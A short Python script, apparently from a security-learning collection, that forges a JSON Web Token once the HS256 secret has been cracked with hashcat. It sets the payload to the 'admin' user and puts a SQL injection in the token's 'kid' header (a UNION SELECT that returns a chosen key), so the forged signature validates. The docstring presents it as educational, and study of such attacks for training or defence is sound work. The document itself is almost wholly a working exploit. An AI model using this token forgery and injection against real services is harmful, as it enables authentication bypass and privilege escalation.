'''
This is purely for learning purpose and not intended to harm any organization,
person or product.
Code to encode and create a tampered jwt when you know/have cracked the secret
using hashcat -m 16500
It uses JWT lib.
Refer other files in this directory for codes doing the exact same thing but
without using the jwt lib (using Python hashlib which the lib itself uses)
'''
import jwt
key = "1" #your secret key
header = {"typ":"JWT","alg":"HS256","kid":"mitxkey' UNION SELECT '1"}
payload = {"user":"admin"}
encodedJwt = jwt.encode(headers=header,payload=payload,key=key,algorithm="HS256")
print(encodedJwt)